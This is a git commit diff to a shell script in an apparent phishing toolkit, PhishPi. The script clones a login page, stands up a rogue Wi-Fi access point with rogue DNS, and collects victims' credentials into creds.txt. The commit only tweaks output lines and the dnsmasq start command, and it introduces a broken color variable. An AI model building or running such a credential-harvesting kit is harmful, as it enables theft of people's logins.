1ce728c08ef68036595cd430a20087a5b84d99f0
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-05-31 13:28:24 -0400

    Update 0365_Captive.sh

--- PhishPi/0365_Captive.sh
+++ PhishPi/0365_Captive.sh
@@ -55,11 +55,10 @@ echo ""
 systemctl stop dnsmasq
 /usr/bin/chromium-browser --no-sandbox 2>/dev/null
 runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html
-echo ""
 echo -e ${yellow}"Cloning finished"${clear}
 echo ""
 sleep 1
-echo -e ${yellow}"$URL Cloned Successfully"${clear}
+echo -e ${blue"$URL Cloned Successfully"${clear}
 sleep 2
 
 #Copying Resources To Local Directory
@@ -130,7 +129,7 @@ iptables -t nat -A POSTROUTING -j MASQUERADE
 sleep 2
 echo ""
 echo -e ${green}"Starting Rouge DNS"${clear}
-service dnsmasq start
+systemctl start dnsmasq
 sleep 4
 echo ""
 echo -e ${red}"Access Point Should Be Up. Watch /var/www/html/creds.txt For Creds"${clear}
